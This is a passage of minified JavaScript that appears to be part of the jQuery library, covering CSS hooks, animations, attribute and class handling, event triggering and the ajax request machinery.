n=Ot(t,"opacity");return""===n?"1":n}}}},cssNumber:{animationIterationCount:!0,columnCount:!0,fillOpacity:!0,flexGrow:!0,flexShrink:!0,fontWeight:!0,lineHeight:!0,opacity:!0,order:!0,orphans:!0,widows:!0,zIndex:!0,zoom:!0},cssProps:{float:"cssFloat"},style:function(t,e,n,i){if(t&&3!==t.nodeType&&8!==t.nodeType&&t.style){var r,o,s,a=f.camelCase(e),l=t.style;return e=f.cssProps[a]||(f.cssProps[a]=Rt(a)||a),s=f.cssHooks[e]||f.cssHooks[a],void 0===n?s&&"get"in s&&void 0!==(r=s.get(t,!1,i))?r:l[e]:("string"===(o=typeof n)&&(r=z.exec(n))&&r[1]&&(n=V(t,e,r),o="number"),void(null!=n&&n==n&&("number"===o&&(n+=r&&r[3]||(f.cssNumber[a]?"":"px")),d.clearCloneStyle||""!==n||0!==e.indexOf("background")||(l[e]="inherit"),s&&"set"in s&&void 0===(n=s.set(t,n,i))||(l[e]=n))))}},css:function(t,e,n,i){var r,o,s,a=f.camelCase(e);return e=f.cssProps[a]||(f.cssProps[a]=Rt(a)||a),(s=f.cssHooks[e]||f.cssHooks[a])&&"get"in s&&(r=s.get(t,!0,n)),void 0===r&&(r=Ot(t,e,i)),"normal"===r&&e in Nt&&(r=Nt[e]),""===n||n?(o=parseFloat(r),!0===n||isFinite(o)?o||0:r):r}}),f.each(["height","width"],(function(t,e){f.cssHooks[e]={get:function(t,n,i){return n?At.test(f.css(t,"display"))&&0===t.offsetWidth?Tt(t,Pt,(function(){return Ft(t,e,i)})):Ft(t,e,i):void 0},set:function(t,n,i){var r,o=i&&Et(t),s=i&&Mt(t,e,i,"border-box"===f.css(t,"boxSizing",!1,o),o);return s&&(r=z.exec(n))&&"px"!==(r[3]||"px")&&(t.style[e]=n,n=f.css(t,e)),jt(0,n,s)}}})),f.cssHooks.marginLeft=It(d.reliableMarginLeft,(function(t,e){return e?(parseFloat(Ot(t,"marginLeft"))||t.getBoundingClientRect().left-Tt(t,{marginLeft:0},(function(){return t.getBoundingClientRect().left})))+"px":void 0})),f.cssHooks.marginRight=It(d.reliableMarginRight,(function(t,e){return e?Tt(t,{display:"inline-block"},Ot,[t,"marginRight"]):void 0})),f.each({margin:"",padding:"",border:"Width"},(function(t,e){f.cssHooks[t+e]={expand:function(n){for(var i=0,r={},o="string"==typeof n?n.split(" "):[n];4>i;i++)r[t+U[i]+e]=o[i]||o[i-2]||o[0];return r}},Ct.test(t)||(f.cssHooks[t+e].set=jt)})),f.fn.extend({css:function(t,e){return B(this,(function(t,e,n){var i,r,o={},s=0;if(f.isArray(e)){for(i=Et(t),r=e.length;r>s;s++)o[e[s]]=f.css(t,e[s],!1,i);return o}return void 0!==n?f.style(t,e,n):f.css(t,e)}),t,e,arguments.length>1)},show:function(){return qt(this,!0)},hide:function(){return qt(this)},toggle:function(t){return"boolean"==typeof t?t?this.show():this.hide():this.each((function(){Z(this)?f(this).show():f(this).hide()}))}}),f.Tween=Ht,Ht.prototype={constructor:Ht,init:function(t,e,n,i,r,o){this.elem=t,this.prop=n,this.easing=r||f.easing._default,this.options=e,this.start=this.now=this.cur(),this.end=i,this.unit=o||(f.cssNumber[n]?"":"px")},cur:function(){var t=Ht.propHooks[this.prop];return t&&t.get?t.get(this):Ht.propHooks._default.get(this)},run:function(t){var e,n=Ht.propHooks[this.prop];return this.options.duration?this.pos=e=f.easing[this.easing](t,this.options.duration*t,0,1,this.options.duration):this.pos=e=t,this.now=(this.end-this.start)*e+this.start,this.options.step&&this.options.step.call(this.elem,this.now,this),n&&n.set?n.set(this):Ht.propHooks._default.set(this),this}},Ht.prototype.init.prototype=Ht.prototype,Ht.propHooks={_default:{get:function(t){var e;return 1!==t.elem.nodeType||null!=t.elem[t.prop]&&null==t.elem.style[t.prop]?t.elem[t.prop]:(e=f.css(t.elem,t.prop,""))&&"auto"!==e?e:0},set:function(t){f.fx.step[t.prop]?f.fx.step[t.prop](t):1!==t.elem.nodeType||null==t.elem.style[f.cssProps[t.prop]]&&!f.cssHooks[t.prop]?t.elem[t.prop]=t.now:f.style(t.elem,t.prop,t.now+t.unit)}}},Ht.propHooks.scrollTop=Ht.propHooks.scrollLeft={set:function(t){t.elem.nodeType&&t.elem.parentNode&&(t.elem[t.prop]=t.now)}},f.easing={linear:function(t){return t},swing:function(t){return.5-Math.cos(t*Math.PI)/2},_default:"swing"},f.fx=Ht.prototype.init,f.fx.step={};var Wt,zt,Ut=/^(?:toggle|show|hide)$/,Zt=/queueHooks$/;function Vt(){return t.setTimeout((function(){Wt=void 0})),Wt=f.now()}function Kt(t,e){var n,i=0,r={height:t};for(e=e?1:0;4>i;i+=2-e)r["margin"+(n=U[i])]=r["padding"+n]=t;return e&&(r.opacity=r.width=t),r}function Xt(t,e,n){for(var i,r=(Yt.tweeners[e]||[]).concat(Yt.tweeners["*"]),o=0,s=r.length;s>o;o++)if(i=r[o].call(n,e,t))return i}function Yt(t,e,n){var i,r,o=0,s=Yt.prefilters.length,a=f.Deferred().always((function(){delete l.elem})),l=function(){if(r)return!1;for(var e=Wt||Vt(),n=Math.max(0,c.startTime+c.duration-e),i=1-(n/c.duration||0),o=0,s=c.tweens.length;s>o;o++)c.tweens[o].run(i);return a.notifyWith(t,[c,i,n]),1>i&&s?n:(a.resolveWith(t,[c]),!1)},c=a.promise({elem:t,props:f.extend({},e),opts:f.extend(!0,{specialEasing:{},easing:f.easing._default},n),originalProperties:e,originalOptions:n,startTime:Wt||Vt(),duration:n.duration,tweens:[],createTween:function(e,n){var i=f.Tween(t,c.opts,e,n,c.opts.specialEasing[e]||c.opts.easing);return c.tweens.push(i),i},stop:function(e){var n=0,i=e?c.tweens.length:0;if(r)return this;for(r=!0;i>n;n++)c.tweens[n].run(1);return e?(a.notifyWith(t,[c,1,0]),a.resolveWith(t,[c,e])):a.rejectWith(t,[c,e]),this}}),u=c.props;for(function(t,e){var n,i,r,o,s;for(n in t)if(r=e[i=f.camelCase(n)],o=t[n],f.isArray(o)&&(r=o[1],o=t[n]=o[0]),n!==i&&(t[i]=o,delete t[n]),(s=f.cssHooks[i])&&"expand"in s)for(n in o=s.expand(o),delete t[i],o)n in t||(t[n]=o[n],e[n]=r);else e[i]=r}(u,c.opts.specialEasing);s>o;o++)if(i=Yt.prefilters[o].call(c,t,u,c.opts))return f.isFunction(i.stop)&&(f._queueHooks(c.elem,c.opts.queue).stop=f.proxy(i.stop,i)),i;return f.map(u,Xt,c),f.isFunction(c.opts.start)&&c.opts.start.call(t,c),f.fx.timer(f.extend(l,{elem:t,anim:c,queue:c.opts.queue})),c.progress(c.opts.progress).done(c.opts.done,c.opts.complete).fail(c.opts.fail).always(c.opts.always)}f.Animation=f.extend(Yt,{tweeners:{"*":[function(t,e){var n=this.createTween(t,e);return V(n.elem,t,z.exec(e),n),n}]},tweener:function(t,e){f.isFunction(t)?(e=t,t=["*"]):t=t.match(P);for(var n,i=0,r=t.length;r>i;i++)n=t[i],Yt.tweeners[n]=Yt.tweeners[n]||[],Yt.tweeners[n].unshift(e)},prefilters:[function(t,e,n){var i,r,o,s,a,l,c,u=this,d={},h=t.style,p=t.nodeType&&Z(t),g=j.get(t,"fxshow");for(i in n.queue||(null==(a=f._queueHooks(t,"fx")).unqueued&&(a.unqueued=0,l=a.empty.fire,a.empty.fire=function(){a.unqueued||l()}),a.unqueued++,u.always((function(){u.always((function(){a.unqueued--,f.queue(t,"fx").length||a.empty.fire()}))}))),1===t.nodeType&&("height"in e||"width"in e)&&(n.overflow=[h.overflow,h.overflowX,h.overflowY],"inline"===("none"===(c=f.css(t,"display"))?j.get(t,"olddisplay")||St(t.nodeName):c)&&"none"===f.css(t,"float")&&(h.display="inline-block")),n.overflow&&(h.overflow="hidden",u.always((function(){h.overflow=n.overflow[0],h.overflowX=n.overflow[1],h.overflowY=n.overflow[2]}))),e)if(r=e[i],Ut.exec(r)){if(delete e[i],o=o||"toggle"===r,r===(p?"hide":"show")){if("show"!==r||!g||void 0===g[i])continue;p=!0}d[i]=g&&g[i]||f.style(t,i)}else c=void 0;if(f.isEmptyObject(d))"inline"===("none"===c?St(t.nodeName):c)&&(h.display=c);else for(i in g?"hidden"in g&&(p=g.hidden):g=j.access(t,"fxshow",{}),o&&(g.hidden=!p),p?f(t).show():u.done((function(){f(t).hide()})),u.done((function(){var e;for(e in j.remove(t,"fxshow"),d)f.style(t,e,d[e])})),d)s=Xt(p?g[i]:0,i,u),i in g||(g[i]=s.start,p&&(s.end=s.start,s.start="width"===i||"height"===i?1:0))}],prefilter:function(t,e){e?Yt.prefilters.unshift(t):Yt.prefilters.push(t)}}),f.speed=function(t,e,n){var i=t&&"object"==typeof t?f.extend({},t):{complete:n||!n&&e||f.isFunction(t)&&t,duration:t,easing:n&&e||e&&!f.isFunction(e)&&e};return i.duration=f.fx.off?0:"number"==typeof i.duration?i.duration:i.duration in f.fx.speeds?f.fx.speeds[i.duration]:f.fx.speeds._default,null!=i.queue&&!0!==i.queue||(i.queue="fx"),i.old=i.complete,i.complete=function(){f.isFunction(i.old)&&i.old.call(this),i.queue&&f.dequeue(this,i.queue)},i},f.fn.extend({fadeTo:function(t,e,n,i){return this.filter(Z).css("opacity",0).show().end().animate({opacity:e},t,n,i)},animate:function(t,e,n,i){var r=f.isEmptyObject(t),o=f.speed(e,n,i),s=function(){var e=Yt(this,f.extend({},t),o);(r||j.get(this,"finish"))&&e.stop(!0)};return s.finish=s,r||!1===o.queue?this.each(s):this.queue(o.queue,s)},stop:function(t,e,n){var i=function(t){var e=t.stop;delete t.stop,e(n)};return"string"!=typeof t&&(n=e,e=t,t=void 0),e&&!1!==t&&this.queue(t||"fx",[]),this.each((function(){var e=!0,r=null!=t&&t+"queueHooks",o=f.timers,s=j.get(this);if(r)s[r]&&s[r].stop&&i(s[r]);else for(r in s)s[r]&&s[r].stop&&Zt.test(r)&&i(s[r]);for(r=o.length;r--;)o[r].elem!==this||null!=t&&o[r].queue!==t||(o[r].anim.stop(n),e=!1,o.splice(r,1));!e&&n||f.dequeue(this,t)}))},finish:function(t){return!1!==t&&(t=t||"fx"),this.each((function(){var e,n=j.get(this),i=n[t+"queue"],r=n[t+"queueHooks"],o=f.timers,s=i?i.length:0;for(n.finish=!0,f.queue(this,t,[]),r&&r.stop&&r.stop.call(this,!0),e=o.length;e--;)o[e].elem===this&&o[e].queue===t&&(o[e].anim.stop(!0),o.splice(e,1));for(e=0;s>e;e++)i[e]&&i[e].finish&&i[e].finish.call(this);delete n.finish}))}}),f.each(["toggle","show","hide"],(function(t,e){var n=f.fn[e];f.fn[e]=function(t,i,r){return null==t||"boolean"==typeof t?n.apply(this,arguments):this.animate(Kt(e,!0),t,i,r)}})),f.each({slideDown:Kt("show"),slideUp:Kt("hide"),slideToggle:Kt("toggle"),fadeIn:{opacity:"show"},fadeOut:{opacity:"hide"},fadeToggle:{opacity:"toggle"}},(function(t,e){f.fn[t]=function(t,n,i){return this.animate(e,t,n,i)}})),f.timers=[],f.fx.tick=function(){var t,e=0,n=f.timers;for(Wt=f.now();e<n.length;e++)(t=n[e])()||n[e]!==t||n.splice(e--,1);n.length||f.fx.stop(),Wt=void 0},f.fx.timer=function(t){f.timers.push(t),t()?f.fx.start():f.timers.pop()},f.fx.interval=13,f.fx.start=function(){zt||(zt=t.setInterval(f.fx.tick,f.fx.interval))},f.fx.stop=function(){t.clearInterval(zt),zt=null},f.fx.speeds={slow:600,fast:200,_default:400},f.fn.delay=function(e,n){return e=f.fx&&f.fx.speeds[e]||e,n=n||"fx",this.queue(n,(function(n,i){var r=t.setTimeout(n,e);i.stop=function(){t.clearTimeout(r)}}))},function(){var t=i.createElement("input"),e=i.createElement("select"),n=e.appendChild(i.createElement("option"));t.type="checkbox",d.checkOn=""!==t.value,d.optSelected=n.selected,e.disabled=!0,d.optDisabled=!n.disabled,(t=i.createElement("input")).value="t",t.type="radio",d.radioValue="t"===t.value}();var Gt,Qt=f.expr.attrHandle;f.fn.extend({attr:function(t,e){return B(this,f.attr,t,e,arguments.length>1)},removeAttr:function(t){return this.each((function(){f.removeAttr(this,t)}))}}),f.extend({attr:function(t,e,n){var i,r,o=t.nodeType;if(3!==o&&8!==o&&2!==o)return void 0===t.getAttribute?f.prop(t,e,n):(1===o&&f.isXMLDoc(t)||(e=e.toLowerCase(),r=f.attrHooks[e]||(f.expr.match.bool.test(e)?Gt:void 0)),void 0!==n?null===n?void f.removeAttr(t,e):r&&"set"in r&&void 0!==(i=r.set(t,n,e))?i:(t.setAttribute(e,n+""),n):r&&"get"in r&&null!==(i=r.get(t,e))?i:null==(i=f.find.attr(t,e))?void 0:i)},attrHooks:{type:{set:function(t,e){if(!d.radioValue&&"radio"===e&&f.nodeName(t,"input")){var n=t.value;return t.setAttribute("type",e),n&&(t.value=n),e}}}},removeAttr:function(t,e){var n,i,r=0,o=e&&e.match(P);if(o&&1===t.nodeType)for(;n=o[r++];)i=f.propFix[n]||n,f.expr.match.bool.test(n)&&(t[i]=!1),t.removeAttribute(n)}}),Gt={set:function(t,e,n){return!1===e?f.removeAttr(t,n):t.setAttribute(n,n),n}},f.each(f.expr.match.bool.source.match(/\w+/g),(function(t,e){var n=Qt[e]||f.find.attr;Qt[e]=function(t,e,i){var r,o;return i||(o=Qt[e],Qt[e]=r,r=null!=n(t,e,i)?e.toLowerCase():null,Qt[e]=o),r}}));var Jt=/^(?:input|select|textarea|button)$/i,te=/^(?:a|area)$/i;f.fn.extend({prop:function(t,e){return B(this,f.prop,t,e,arguments.length>1)},removeProp:function(t){return this.each((function(){delete this[f.propFix[t]||t]}))}}),f.extend({prop:function(t,e,n){var i,r,o=t.nodeType;if(3!==o&&8!==o&&2!==o)return 1===o&&f.isXMLDoc(t)||(e=f.propFix[e]||e,r=f.propHooks[e]),void 0!==n?r&&"set"in r&&void 0!==(i=r.set(t,n,e))?i:t[e]=n:r&&"get"in r&&null!==(i=r.get(t,e))?i:t[e]},propHooks:{tabIndex:{get:function(t){var e=f.find.attr(t,"tabindex");return e?parseInt(e,10):Jt.test(t.nodeName)||te.test(t.nodeName)&&t.href?0:-1}}},propFix:{for:"htmlFor",class:"className"}}),d.optSelected||(f.propHooks.selected={get:function(t){var e=t.parentNode;return e&&e.parentNode&&e.parentNode.selectedIndex,null},set:function(t){var e=t.parentNode;e&&(e.selectedIndex,e.parentNode&&e.parentNode.selectedIndex)}}),f.each(["tabIndex","readOnly","maxLength","cellSpacing","cellPadding","rowSpan","colSpan","useMap","frameBorder","contentEditable"],(function(){f.propFix[this.toLowerCase()]=this}));var ee=/[\t\r\n\f]/g;function ne(t){return t.getAttribute&&t.getAttribute("class")||""}f.fn.extend({addClass:function(t){var e,n,i,r,o,s,a,l=0;if(f.isFunction(t))return this.each((function(e){f(this).addClass(t.call(this,e,ne(this)))}));if("string"==typeof t&&t)for(e=t.match(P)||[];n=this[l++];)if(r=ne(n),i=1===n.nodeType&&(" "+r+" ").replace(ee," ")){for(s=0;o=e[s++];)i.indexOf(" "+o+" ")<0&&(i+=o+" ");r!==(a=f.trim(i))&&n.setAttribute("class",a)}return this},removeClass:function(t){var e,n,i,r,o,s,a,l=0;if(f.isFunction(t))return this.each((function(e){f(this).removeClass(t.call(this,e,ne(this)))}));if(!arguments.length)return this.attr("class","");if("string"==typeof t&&t)for(e=t.match(P)||[];n=this[l++];)if(r=ne(n),i=1===n.nodeType&&(" "+r+" ").replace(ee," ")){for(s=0;o=e[s++];)for(;i.indexOf(" "+o+" ")>-1;)i=i.replace(" "+o+" "," ");r!==(a=f.trim(i))&&n.setAttribute("class",a)}return this},toggleClass:function(t,e){var n=typeof t;return"boolean"==typeof e&&"string"===n?e?this.addClass(t):this.removeClass(t):f.isFunction(t)?this.each((function(n){f(this).toggleClass(t.call(this,n,ne(this),e),e)})):this.each((function(){var e,i,r,o;if("string"===n)for(i=0,r=f(this),o=t.match(P)||[];e=o[i++];)r.hasClass(e)?r.removeClass(e):r.addClass(e);else void 0!==t&&"boolean"!==n||((e=ne(this))&&j.set(this,"__className__",e),this.setAttribute&&this.setAttribute("class",e||!1===t?"":j.get(this,"__className__")||""))}))},hasClass:function(t){var e,n,i=0;for(e=" "+t+" ";n=this[i++];)if(1===n.nodeType&&(" "+ne(n)+" ").replace(ee," ").indexOf(e)>-1)return!0;return!1}});var ie=/\r/g,re=/[\x20\t\r\n\f]+/g;f.fn.extend({val:function(t){var e,n,i,r=this[0];return arguments.length?(i=f.isFunction(t),this.each((function(n){var r;1===this.nodeType&&(null==(r=i?t.call(this,n,f(this).val()):t)?r="":"number"==typeof r?r+="":f.isArray(r)&&(r=f.map(r,(function(t){return null==t?"":t+""}))),(e=f.valHooks[this.type]||f.valHooks[this.nodeName.toLowerCase()])&&"set"in e&&void 0!==e.set(this,r,"value")||(this.value=r))}))):r?(e=f.valHooks[r.type]||f.valHooks[r.nodeName.toLowerCase()])&&"get"in e&&void 0!==(n=e.get(r,"value"))?n:"string"==typeof(n=r.value)?n.replace(ie,""):null==n?"":n:void 0}}),f.extend({valHooks:{option:{get:function(t){var e=f.find.attr(t,"value");return null!=e?e:f.trim(f.text(t)).replace(re," ")}},select:{get:function(t){for(var e,n,i=t.options,r=t.selectedIndex,o="select-one"===t.type||0>r,s=o?null:[],a=o?r+1:i.length,l=0>r?a:o?r:0;a>l;l++)if(((n=i[l]).selected||l===r)&&(d.optDisabled?!n.disabled:null===n.getAttribute("disabled"))&&(!n.parentNode.disabled||!f.nodeName(n.parentNode,"optgroup"))){if(e=f(n).val(),o)return e;s.push(e)}return s},set:function(t,e){for(var n,i,r=t.options,o=f.makeArray(e),s=r.length;s--;)((i=r[s]).selected=f.inArray(f.valHooks.option.get(i),o)>-1)&&(n=!0);return n||(t.selectedIndex=-1),o}}}}),f.each(["radio","checkbox"],(function(){f.valHooks[this]={set:function(t,e){return f.isArray(e)?t.checked=f.inArray(f(t).val(),e)>-1:void 0}},d.checkOn||(f.valHooks[this].get=function(t){return null===t.getAttribute("value")?"on":t.value})}));var oe=/^(?:focusinfocus|focusoutblur)$/;f.extend(f.event,{trigger:function(e,n,r,o){var s,a,l,c,d,h,p,g=[r||i],m=u.call(e,"type")?e.type:e,v=u.call(e,"namespace")?e.namespace.split("."):[];if(a=l=r=r||i,3!==r.nodeType&&8!==r.nodeType&&!oe.test(m+f.event.triggered)&&(m.indexOf(".")>-1&&(v=m.split("."),m=v.shift(),v.sort()),d=m.indexOf(":")<0&&"on"+m,(e=e[f.expando]?e:new f.Event(m,"object"==typeof e&&e)).isTrigger=o?2:3,e.namespace=v.join("."),e.rnamespace=e.namespace?new RegExp("(^|\\.)"+v.join("\\.(?:.*\\.|)")+"(\\.|$)"):null,e.result=void 0,e.target||(e.target=r),n=null==n?[e]:f.makeArray(n,[e]),p=f.event.special[m]||{},o||!p.trigger||!1!==p.trigger.apply(r,n))){if(!o&&!p.noBubble&&!f.isWindow(r)){for(c=p.delegateType||m,oe.test(c+m)||(a=a.parentNode);a;a=a.parentNode)g.push(a),l=a;l===(r.ownerDocument||i)&&g.push(l.defaultView||l.parentWindow||t)}for(s=0;(a=g[s++])&&!e.isPropagationStopped();)e.type=s>1?c:p.bindType||m,(h=(j.get(a,"events")||{})[e.type]&&j.get(a,"handle"))&&h.apply(a,n),(h=d&&a[d])&&h.apply&&D(a)&&(e.result=h.apply(a,n),!1===e.result&&e.preventDefault());return e.type=m,o||e.isDefaultPrevented()||p._default&&!1!==p._default.apply(g.pop(),n)||!D(r)||d&&f.isFunction(r[m])&&!f.isWindow(r)&&((l=r[d])&&(r[d]=null),f.event.triggered=m,r[m](),f.event.triggered=void 0,l&&(r[d]=l)),e.result}},simulate:function(t,e,n){var i=f.extend(new f.Event,n,{type:t,isSimulated:!0});f.event.trigger(i,null,e)}}),f.fn.extend({trigger:function(t,e){return this.each((function(){f.event.trigger(t,e,this)}))},triggerHandler:function(t,e){var n=this[0];return n?f.event.trigger(t,e,n,!0):void 0}}),f.each("blur focus focusin focusout load resize scroll unload click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup error contextmenu".split(" "),(function(t,e){f.fn[e]=function(t,n){return arguments.length>0?this.on(e,null,t,n):this.trigger(e)}})),f.fn.extend({hover:function(t,e){return this.mouseenter(t).mouseleave(e||t)}}),d.focusin="onfocusin"in t,d.focusin||f.each({focus:"focusin",blur:"focusout"},(function(t,e){var n=function(t){f.event.simulate(e,t.target,f.event.fix(t))};f.event.special[e]={setup:function(){var i=this.ownerDocument||this,r=j.access(i,e);r||i.addEventListener(t,n,!0),j.access(i,e,(r||0)+1)},teardown:function(){var i=this.ownerDocument||this,r=j.access(i,e)-1;r?j.access(i,e,r):(i.removeEventListener(t,n,!0),j.remove(i,e))}}}));var se=t.location,ae=f.now(),le=/\?/;f.parseJSON=function(t){return JSON.parse(t+"")},f.parseXML=function(e){var n;if(!e||"string"!=typeof e)return null;try{n=(new t.DOMParser).parseFromString(e,"text/xml")}catch(t){n=void 0}return n&&!n.getElementsByTagName("parsererror").length||f.error("Invalid XML: "+e),n};var ce=/#.*$/,ue=/([?&])_=[^&]*/,de=/^(.*?):[ \t]*([^\r\n]*)$/gm,he=/^(?:GET|HEAD)$/,fe=/^\/\//,pe={},ge={},me="*/".concat("*"),ve=i.createElement("a");function ye(t){return function(e,n){"string"!=typeof e&&(n=e,e="*");var i,r=0,o=e.toLowerCase().match(P)||[];if(f.isFunction(n))for(;i=o[r++];)"+"===i[0]?(i=i.slice(1)||"*",(t[i]=t[i]||[]).unshift(n)):(t[i]=t[i]||[]).push(n)}}function be(t,e,n,i){var r={},o=t===ge;function s(a){var l;return r[a]=!0,f.each(t[a]||[],(function(t,a){var c=a(e,n,i);return"string"!=typeof c||o||r[c]?o?!(l=c):void 0:(e.dataTypes.unshift(c),s(c),!1)})),l}return s(e.dataTypes[0])||!r["*"]&&s("*")}function we(t,e){var n,i,r=f.ajaxSettings.flatOptions||{};for(n in e)void 0!==e[n]&&((r[n]?t:i||(i={}))[n]=e[n]);return i&&f.extend(!0,t,i),t}ve.href=se.href,f.extend({active:0,lastModified:{},etag:{},ajaxSettings:{url:se.href,type:"GET",isLocal:/^(?:about|app|app-storage|.+-extension|file|res|widget):$/.test(se.protocol),global:!0,processData:!0,async:!0,contentType:"application/x-www-form-urlencoded; charset=UTF-8",accepts:{"*":me,text:"text/plain",html:"text/html",xml:"application/xml, text/xml",json:"application/json, text/javascript"},contents:{xml:/\bxml\b/,html:/\bhtml/,json:/\bjson\b/},responseFields:{xml:"responseXML",text:"responseText",json:"responseJSON"},converters:{"* text":String,"text html":!0,"text json":f.parseJSON,"text xml":f.parseXML},flatOptions:{url:!0,context:!0}},ajaxSetup:function(t,e){return e?we(we(t,f.ajaxSettings),e):we(f.ajaxSettings,t)},ajaxPrefilter:ye(pe),ajaxTransport:ye(ge),ajax:function(e,n){"object"==typeof e&&(n=e,e=void 0),n=n||{};var r,o,s,a,l,c,u,d,h=f.ajaxSetup({},n),p=h.context||h,g=h.context&&(p.nodeType||p.jquery)?f(p):f.event,m=f.Deferred(),v=f.Callbacks("once memory"),y=h.statusCode||{},b={},w={},k=0,x="canceled",_={readyState:0,getResponseHeader:function(t){var e;if(2===k){if(!a)for(a={};e=de.exec(s);)a[e[1].toLowerCase()]=e[2];e=a[t.toLowerCase()]}return null==e?null:e},getAllResponseHeaders:function(){return 2===k?s:null},setRequestHeader:function(t,e){var n=t.toLowerCase();return k||(t=w[n]=w[n]||t,b[t]=e),this},overrideMimeType:function(t){return k||(h.mimeType=t),this},statusCode:function(t){var e;if(t)if(2>k)for(e in t)y[e]=[y[e],t[e]];else _.always(t[_.status]);return this},abort:function(t){var e=t||x;return r&&r.abort(e),S(0,e),this}};if(m.promise(_).complete=v.add,_.success=_.done,_.error=_.fail,h.url=((e||h.url||se.href)+"").replace(ce,"").replace(fe,se.protocol+"//"),h.type=n.method||n.type||h.method||h.type,h.dataTypes=f.trim(h.dataType||"*").toLowerCase().match(P)||[""],null==h.crossDomain){c=i.createElement("a");try{c.href=h.url,c.href=c.href,h.crossDomain=ve.protocol+"//"+ve.host!=c.protocol+"//"+c.host}catch(t){h.crossDomain=!0}}if(h.data&&h.processData&&"string"!=typeof h.data&&(h.data=f.param(h.data,h.traditional)),be(pe,h,n,_),2===k)return _;for(d in(u=f.event&&h.global)&&0==f.active++&&f.event.trigger("ajaxStart"),h.type=h.type.toUpperCase(),h.hasContent=!he.test(h.type),o=h.url,h.hasContent||(h.data&&(o=h.url+=(le.test(o)?"&":"?")+h.data,delete h.data),!1===h.cache&&(h.url=ue.test(o)?o.replace(ue,"$1_="+ae++):o+(le.test(o)?"&":"?")+"_="+ae++)),h.ifModified&&(f.lastModified[o]&&_.setRequestHeader("If-Modified-Since",f.lastModified[o]),f.etag[o]&&_.setRequestHeader("If-None-Match",f.etag[o])),(h.data&&h.hasContent&&!1!==h.contentType||n.contentType)&&_.setRequestHeader("Content-Type",h.contentType),_.setRequestHeader("Accept",h.dataTypes[0]&&h.accepts[h.dataTypes[0]]?h.accepts[h.dataTypes[0]]+("*"!==h.dataTypes[0]?", "+me+"; q=0.01":""):h.accepts["*"]),h.headers)_.setRequestHeader(d,h.headers[d]);if(h.beforeSend&&(!1===h.beforeSend.call(p,_,h)||2===k))return _.abort();for(d in x="abort",{success:1,error:1,complete:1})_[d](h[d]);if(r=be(ge,h,n,_)){if(_.readyState=1,u&&g.trigger("ajaxSend",[_,h]),2===k)return _;h.async&&h.timeout>0&&(l=t.setTimeout((function(){_.abort("timeout")}),h.timeout));try{k=1,r.send(b,S)}catch(t){if(!(2>k))throw t;S(-1,t)}}else S(-1,"No Transport");function S(e,n,i,a){var c,d,b,w,x,S=n;2!==k&&(k=2,l&&t.clearTimeout(l),r=void 0,s=a||"",_.readyState=e>0?4:0,c=e>=200&&300>e||304===e,i&&(w=function(t,e,n){for(var i,r,o,s,a=t.contents,l=t.dataTypes;"*"===l[0];)l.shift(),void 0===i&&(i=t.mimeType||e.getResponseHeader("Content-Type"));if(i)for(r in a)if(a[r]&&a[r].test(i)){l.unshift(r);break}if(l[0]in n)o=l[0];else{for(r in n){if(!l[0]||t.converters[r+" "+l[0]]){o=r;break}s||(s=r)}o=o||s}return o?(o!==l[0]&&l.unshift(o),n[o]):void 0}(h,_,i)),w=function(t,e,n,i){var r,o,s,a,l,c={},u=t.dataTypes.slice();if(u[1])for(s in t.converters)c[s.toLowerCase()]=t.converters[s];for(o=u.shift();o;)if(t.responseFields[o]&&(n[t.responseFields[o]]=e),!l&&i&&t.dataFilter&&(e=t.dataFilter(e,t.dataType)),l=o,o=u.shift())if("*"===o)o=l;else if("*"!==l&&l!==o){if(!(s=c[l+" "+o]||c["* "+o]))for(r in c)if((a=r.split(" "))[1]===o&&(s=c[l+" "+a[0]]||c["* "+a[0]])){!0===s?s=c[r]:!0!==c[r]&&(o=a[0],u.unshift(a[1]));break}if(!0!==s)if(s&&t.throws)e=s(e);else try{e=s(e)}catch(t){return{state:"parsererror",error:s?t:"No conversion from "+l+" to "+o}}}return{state:"success",data:e}}(h,w,_,c),c?(h.ifModified&&((x=_.getResponseHeader("Last-Modified"))&&(f.lastModified[o]=x),(x=_.getResponseHeader("etag"))&&(f.etag[o]=x)),204===e||"HEAD"===h.type?S="nocontent":304===e?S="notmodified":(S=w.state,d=w.data,c=!(b=w.error))):(b=S,!e&&S||(S="error",0>e&&(e=0))),_.status=e,_.statusText=(n||S)+"",c?m.resolveWith(p,[d,S,_]):m.rejectWith(p,[_,S,b]),_.statusCode(y),y=void 0,u&&g.trigger(c?"ajaxSuccess":"ajaxError",[_,h,c?d:b]),v.fireWith(p,[_,S]),u&&(g.trigger("ajaxComplete",[_,h]),--f.active||f.event.trigger("ajaxStop")))}return _},getJSON:function(t,e,n){return f.get(t,e,n,"json")},getScript:function(t,e){return f.get(t,void 0,e,"script")}}),f.each(["get","post"],(function(t,e){f[e]=function(t,n,i,r){return f.isFunction(n)&&(r=r||i,i=n,n=void 0),f.ajax(f.extend({url:t,type:e,dataType:r,data:n,success:i},f.isPlainObject(t)&&t))}})),f._evalUrl=function(t){return f.ajax({url:t,type:"GET",dataType:"script",async:!1,global:!1,throws:!0})},f.fn.extend({wrapAll:function(t){var e;return f.isFunction(t)?this.each((function(e){f(this).wrapAll(t.call(this,e))})):(this[0]&&(e=f(t,this[0].ownerDocument).eq(0).clone(!0),this[0].parentNode&&e.insertBefore(this[0]),e.map((function(){for(var t=this;t.firstElementChild;)t=t.firstElementChild;return t})).append(this)),this)},wrapInner:function(t){return f.isFunction(t)?this.each((function(e){f(this).wrapInner(t.call(this,e))})):this.each((function(){var e=f(this),n=e.contents();n.length?n.wrapAll(t):e.append(t)}))},wrap:function(t){var e=f.isFunction(t);return this.each((function(n){f(this).wrapAll(e?t.call(this,n):t)}))},unwrap:function(){return this.parent().each((function(){f.nodeName(this,"body")||f(this).replaceWith(this.childNodes)})).end()}}),f.expr.filters.hidden=function(t){return!f.expr.filters.visible(t)},f.expr.filters.visible=function(t){return t.offsetWidth>0||t.offsetHeight>0||t.getClientRects().length>0};var ke=/%20/g,xe=/\[\]$/,_e=/\r?\n/g,Se=/^(?:submit|button|image|reset|file)$/i,Ce=/^(?:input|select|textarea|keygen)/i;function $e(t,e,n,i){var r;if(f.isArray(e))f.each(e,(function(e,r){n||xe.test(t)?i(t,r):$e(t+"["+("object"==typeof r&&null!=r?e:"")+"]",r,n,i)}));else if(n||"object"!==f.type(e))i(t,e);else for(r in e)$e(t+"["+r+"]",e[r],n,i)}f.param=function(t,e){var 